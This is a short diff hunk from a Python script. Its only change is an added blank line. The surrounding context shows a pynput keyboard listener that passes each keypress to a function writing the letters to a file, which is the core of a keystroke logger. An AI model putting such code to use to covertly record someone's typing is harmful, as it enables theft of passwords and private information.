@@ -29,4 +29,5 @@ def writetofile(key):
         f.write(letter)
     
 with Listener(on_press=writetofile) as listener:
+
     listener.join()
